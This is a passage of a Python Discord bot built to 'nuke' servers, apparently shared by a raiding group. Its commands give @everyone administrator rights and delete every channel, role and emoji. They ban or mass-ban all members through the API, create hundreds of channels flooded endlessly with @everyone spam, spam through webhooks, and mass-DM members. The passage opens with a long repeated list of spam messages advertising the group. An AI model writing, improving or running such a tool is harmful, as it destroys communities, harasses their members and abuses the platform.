"@everyone wizzed" , "@everyone 3hunna", "@everyone syngate was here discord.gg/eviction " , "@everyone discord.gg/eviction" , "@everyone syngate made this one" , "@everyone https://github.com/syngatelol" , "@everyone wizzed" , "@everyone 3hunna", "@everyone syngate was here discord.gg/eviction " , "@everyone discord.gg/eviction" , "@everyone syngate made this one" , "@everyone https://github.com/syngatelol" , "@everyone wizzed" , "@everyone 3hunna", "@everyone syngate was here discord.gg/eviction " , "@everyone discord.gg/eviction" , "@everyone syngate made this one" , "@everyone https://github.com/syngatelol" , "@everyone wizzed" , "@everyone 3hunna", "@everyone syngate was here discord.gg/eviction " , "@everyone discord.gg/eviction" , "@everyone syngate made this one" , "@everyone https://github.com/syngatelol" , "@everyone wizzed" , "@everyone 3hunna", "@everyone syngate was here discord.gg/eviction " , "@everyone discord.gg/eviction" , "@everyone syngate made this one" , "@everyone https://github.com/syngatelol" , "@everyone wizzed" , "@everyone 3hunna", "@everyone syngate was here discord.gg/eviction " , "@everyone discord.gg/eviction" , "@everyone syngate made this one" , "@everyone https://github.com/syngatelol" , "@everyone wizzed" , "@everyone 3hunna", "@everyone syngate was here discord.gg/eviction " , "@everyone discord.gg/eviction" , "@everyone syngate made this one" , "@everyone https://github.com/syngatelol" , "@everyone wizzed" , "@everyone 3hunna", "@everyone syngate was here discord.gg/eviction " , "@everyone discord.gg/eviction" , "@everyone syngate made this one" , "@everyone https://github.com/syngatelol" , "@everyone wizzed" , "@everyone 3hunna", "@everyone syngate was here discord.gg/eviction " , "@everyone discord.gg/eviction" , "@everyone syngate made this one" , "@everyone https://github.com/syngatelol" , "@everyone wizzed" , "@everyone 3hunna", "@everyone syngate was here discord.gg/eviction " , "@everyone discord.gg/eviction" , "@everyone syngate made this one" , "@everyone https://github.com/syngatelol" , "@everyone wizzed" , "@everyone 3hunna", "@everyone syngate was here discord.gg/eviction " , "@everyone discord.gg/eviction" , "@everyone syngate made this one" , "@everyone https://github.com/syngatelol" , "@everyone wizzed" , "@everyone 3hunna", "@everyone syngate was here discord.gg/eviction " , "@everyone discord.gg/eviction" , "@everyone syngate made this one" , "@everyone https://github.com/syngatelol" , "@everyone wizzed" , "@everyone 3hunna", "@everyone syngate was here discord.gg/eviction " , "@everyone discord.gg/eviction" , "@everyone syngate made this one" , "@everyone https://github.com/syngatelol" , "@everyone wizzed" , "@everyone 3hunna", "@everyone syngate was here discord.gg/eviction " , "@everyone discord.gg/eviction" , "@everyone syngate made this one" , "@everyone https://github.com/syngatelol" , "@everyone wizzed" , "@everyone 3hunna", "@everyone syngate was here discord.gg/eviction " , "@everyone discord.gg/eviction" , "@everyone syngate made this one" , "@everyone https://github.com/syngatelol" , "@everyone wizzed" , "@everyone 3hunna", "@everyone syngate was here discord.gg/eviction " , "@everyone discord.gg/eviction" , "@everyone syngate made this one" , "@everyone https://github.com/syngatelol" , "@everyone wizzed" , "@everyone 3hunna", "@everyone syngate was here discord.gg/eviction " , "@everyone discord.gg/eviction" , "@everyone syngate made this one" , "@everyone https://github.com/syngatelol" , "@everyone wizzed" , "@everyone 3hunna", "@everyone syngate was here discord.gg/eviction " , "@everyone discord.gg/eviction" , "@everyone syngate made this one" , "@everyone https://github.com/syngatelol" , "@everyone wizzed" , "@everyone 3hunna", "@everyone syngate was here discord.gg/eviction " , "@everyone discord.gg/eviction" , "@everyone syngate made this one" , "@everyone https://github.com/syngatelol" , "@everyone wizzed" , "@everyone 3hunna", "@everyone syngate was here discord.gg/eviction " , "@everyone discord.gg/eviction" , "@everyone syngate made this one" , "@everyone https://github.com/syngatelol" , "@everyone wizzed" , "@everyone 3hunna", "@everyone syngate was here discord.gg/eviction " , "@everyone discord.gg/eviction" , "@everyone syngate made this one" , "@everyone https://github.com/syngatelol" , "@everyone wizzed" , "@everyone 3hunna", "@everyone syngate was here discord.gg/eviction " , "@everyone discord.gg/eviction" , "@everyone syngate made this one" , "@everyone https://github.com/syngatelol" , "@everyone wizzed" , "@everyone 3hunna", "@everyone syngate was here discord.gg/eviction " , "@everyone discord.gg/eviction" , "@everyone syngate made this one" , "@everyone https://github.com/syngatelol" , "@everyone wizzed" , "@everyone 3hunna", "@everyone syngate was here discord.gg/eviction " , "@everyone discord.gg/eviction" , "@everyone syngate made this one" , "@everyone https://github.com/syngatelol" , "@everyone wizzed" , "@everyone 3hunna", "@everyone syngate was here discord.gg/eviction " , "@everyone discord.gg/eviction" , "@everyone syngate made this one" , "@everyone https://github.com/syngatelol" , "@everyone wizzed" , "@everyone 3hunna", "@everyone syngate was here discord.gg/eviction " , "@everyone discord.gg/eviction" , "@everyone syngate made this one" , "@everyone https://github.com/syngatelol" , "@everyone wizzed" , "@everyone 3hunna", "@everyone syngate was here discord.gg/eviction " , "@everyone discord.gg/eviction" , "@everyone syngate made this one" , "@everyone https://github.com/syngatelol" , "@everyone wizzed" , "@everyone 3hunna", "@everyone syngate was here discord.gg/eviction " , "@everyone discord.gg/eviction" , "@everyone syngate made this one" , "@everyone https://github.com/syngatelol" , "@everyone wizzed" , "@everyone 3hunna"]

client = commands.Bot(command_prefix=".")
intents = discord.Intents.default()
intents.guilds = True
intents.presences = True
intents.members = True
intents.guild_messages = True

@client.event
async def on_ready():
    print('''
    
ready to wizz
                cmds .wizz (self explanatory) & .ice (mass webhook spammer & .massban (self explanatory))
Support: https://github.com/syngatelol
''')
    await client.change_presence(activity=discord.Game(name=".gg/eviction"))

@client.command()
@commands.is_owner()
async def STOP(ctx):
    await ctx.bot.logout()
    print(Fore.GREEN + f"{client.user.name} has logged out successfully." + Fore.RESET)

@client.command()
async def wizz(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    try:
        role = discord.utils.get(guild.roles, name="@everyone")
        await role.edit(permissions=Permissions.all())
        print(Fore.MAGENTA + "I have given everyone admin." + Fore.RESET)
    except:
        print(Fore.GREEN + "I was unable to give everyone admin." + Fore.RESET)

    for channel in guild.channels:
        try:
            await channel.delete()
            print(Fore.MAGENTA + f"{channel.name} was deleted." + Fore.RESET)
        except:
            print(Fore.GREEN + f"{channel.name} was NOT deleted." + Fore.RESET)

    for member in guild.members:
        try:
            await member.ban()
            print(Fore.MAGENTA + f"{member.name}#{member.discriminator} was banned." + Fore.RESET)
        except:
            print(Fore.GREEN + f"{member.name}#{member.discriminator} was unable to be banned." + Fore.RESET)

    for role in guild.roles:
        try:
            await role.delete()
            print(Fore.MAGENTA + f"{role.name} has been deleted." + Fore.RESET)
        except:
            print(Fore.GREEN + f"{role.name} has not been deleted." + Fore.RESET)

    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
            print(Fore.MAGENTA + f"{emoji.name} was deleted." + Fore.RESET)
        except:
            print(Fore.GREEN + f"{emoji.name} wasn't deleted." + Fore.RESET)

    banned_users = await guild.bans()
    for ban_entry in banned_users:
        user = ban_entry.user
        try:
            await user.unban(guild)
            print(Fore.MAGENTA + f"{user.name}#{user.discriminator} was successfully unbanned." + Fore.RESET)
        except:
            print(Fore.GREEN + f"{user.name}#{user.discriminator} was not unbanned." + Fore.RESET)

    await guild.create_text_channel("syngate")
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age=0, max_uses=0)
        print(f"New Invite: {link}")

    amount = 500
    for i in range(amount):
        await guild.create_text_channel(random.choice(SPAM_CHANNEL))

    print(f"Nuked {guild.name} successfully.")
    return

@client.event
async def on_guild_channel_create(channel):
    while True:
        await channel.send(random.choice(SPAM_MESSAGE))

@client.command()
async def ice(ctx):
    if ctx.author == client.user:
        return

    global spamming

    if ctx.message.content.lower() == '.ice':
        if spamming:
            await ctx.channel.send('Spamming is already in progress.')
        else:
            spamming = True
            guild = ctx.guild

            text_channels = [channel for channel in guild.channels if isinstance(channel, discord.TextChannel)]

            if len(text_channels) < 20:
                for channel in text_channels:
                    webhook = await channel.create_webhook(name='.gg/eviction ran me')
                    webhooks[channel.id] = webhook  
                    print(f"Webhook created in channel: {channel.name} ({channel.id})")
                    print(f"Webhook URL: {webhook.url}")
            else:
                
                selected_channels = random.sample(text_channels, k=10)
                for channel in selected_channels:
                    webhook = await channel.create_webhook(name='.gg/eviction ran me')
                    webhooks[channel.id] = webhook  
                    print(f"Webhook created in channel: {channel.name} ({channel.id})")
                    print(f"Webhook URL: {webhook.url}")

            
            while spamming:
                for channel_id, webhook in webhooks.items():
                    await webhook.send('/eviction X syngate was here @everyone')
                    print(f"Message sent in channel: {guild.get_channel(channel_id).name} ({channel_id})")
                    await asyncio.sleep(0.1)  

            await ctx.channel.send('Spamming started in the specified channels.')

    elif ctx.message.content.lower() == '.stopspam':
        spamming = False
        await ctx.channel.send('Spamming stopped.')

@client.event
async def on_webhook_update(payload):
    global spamming

    
    if payload.action_type == discord.AuditLogAction.webhook_delete:
        webhook_id = payload.target_id
        for channel_id, webhook in webhooks.items():
            if webhook.id == webhook_id:
                del webhooks[channel_id]

                
                if not webhooks:
                    spamming = False

async def concurrent_bulk_ban(session, url, headers, payload):
    async with session.post(url, headers=headers, json=payload) as response:
        if response.status == 403:
            print('Insufficient permissions to perform bulk ban.')
            return
        elif response.status != 200:
            print(f'Bulk ban failed with status code: {response.status}')
            return
        else:
            member_ids = payload['user_ids']
            for member_id in member_ids:
                print(f'Banned: {member_id}')

@client.command()
async def massban(ctx):
    if ctx.author.guild_permissions.ban_members:
        await ctx.message.delete()

        
        members = await ctx.guild.fetch_members(limit=None).flatten()
        member_ids = [member.id for member in members]

        # Divide members into chunks of 100 for bulk banning DO NOT CHANGE ABOVE 100
        chunk_size = 100

    
        async with aiohttp.ClientSession() as session:
            tasks = []
            for i in range(0, len(member_ids), chunk_size):
                member_chunk = member_ids[i: i + chunk_size]

                
                url = f'https://discord.com/api/v9/guilds/{ctx.guild.id}/bans'
                headers = {
                    'Authorization': f'Bot {ctx.bot.http.token}',
                    'Content-Type': 'application/json',
                }

                
                payload = {
                    'delete_message_days': 7,
                    'reason': 'Mass Ban by .gg/eviction',
                    'user_ids': member_chunk,
                }

                
                task = concurrent_bulk_ban(session, url, headers, payload)
                tasks.append(task)

            
            await asyncio.gather(*tasks)

    else:
        await ctx.send("You don't have the necessary permissions to use this command.")

@client.command()
async def massdm(ctx, *, message_content: str):
    guild = ctx.guild
    dm_content = message_content
    dm_count = 0
    for member in guild.members:
        try:
            if not member.bot:
                await member.send(dm_content)
                print(f"{Fore.PURPLE}DM sent to {member.name}#{member.discriminator} (ID: {member.id}){Fore.RESET}")
                dm_count += 1
                await asyncio.sleep(0.5)
        except discord.Forbidden:
            print(f"{Fore.RED}Failed to send DM to {member.name}#{member.discriminator} (ID: {member.id}) - Missing Permissions{Fore.RESET}")
        except discord.HTTPException as e:
            if e.code == 50007:
                print(f"{Fore.RED}Failed to send DM to {member.name}#{member.discriminator} (ID: {member.id}) - Cannot send messages to this user{Fore.RESET}")
            else:
                print(f"{Fore.RED}Failed to send DM to {member.name}#{member.discriminator} (ID: {member.id}) - {e}{Fore.RESET}")

    print(f"{Fore.CYAN}DMs sent to {dm_count} members in the server.{Fore.RESET}")

@client.command()
async def raid(ctx):
    guild = ctx.guild
    colors = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]

    print('Deleting all roles and channels...')

    for role in guild.roles:
        try:
            await role.delete()
            print(f'{random.choice(colors)}Role "{role.name}" (ID: {role.id}) deleted.{Style.RESET_ALL}')
        except discord.Forbidden:
            print(f'{Fore.RED}Failed to delete role "{role.name}" (ID: {role.id}) - Missing Permissions{Style.RESET_ALL}')
        except discord.HTTPException as e:
            print(f'{Fore.RED}Failed to delete role "{role.name}" (ID: {role.id}) - {e}{Style.RESET_ALL}')

    for channel in guild.channels:
        try:
            await channel.delete()
            print(f'{random.choice(colors)}Channel "{channel.name}" (ID: {channel.id}) deleted.{Style.RESET_ALL}')
        except discord.Forbidden:
            print(f'{Fore.RED}Failed to delete channel "{channel.name}" (ID: {channel.id}) - Missing Permissions{Style.RESET_ALL}')
        except discord.HTTPException as e:
            print(f'{Fore.RED}Failed to delete channel "{channel.name}" (ID: {channel.id}) - {e}{Style.RESET_ALL}')

STREAMER_MODE_STATUS = {
    'type': discord.ActivityType.streaming,
    'name': 'wizzing discord.com servers',
    'url': 'https://twitch.tv/syngatelol'
}

@client.event
async def on_ready():
    print(f'ready to wizz as {client.user.name}')
    await client.change_presence(activity=discord.Streaming(**STREAMER_MODE_STATUS))
    update_status.start()

@tasks.loop(seconds=120)
async def update_status():
    await client.change_presence(activity=discord.Streaming(**STREAMER_MODE_STATUS))

@client.command()
async def set_streamer_mode(ctx, *, status_message: str = 'wizzing discord.com'):
    global STREAMER_MODE_STATUS
    STREAMER_MODE_STATUS['name'] = status_message
    await ctx.send(f'Streamer mode status set to: {status_message}')

@client.command()
@commands.cooldown(1, 60, commands.BucketType.user)
async def random_streamer_status(ctx):
    global STREAMER_MODE_STATUS
    possible_statuses = [
        'wizzing servers',
        'nuking servers',
        'raiding servers',
        'mass pinging servers',
        'watching servers',
        '.gg/eviction',
        'Reading a book'
    ]
    random_status = random.choice(possible_statuses)
    STREAMER_MODE_STATUS['name'] = random_status
    await ctx.send(f'Random streamer mode status set to: {random_status}')

@client.event
async def on_message(message):
    if message.author.bot:
        return

    if message.content.lower().startswith('!set_streamer_mode'):
        return

    await client.process_commands(message)
token = input("Enter your bot token: ")
client.run(token)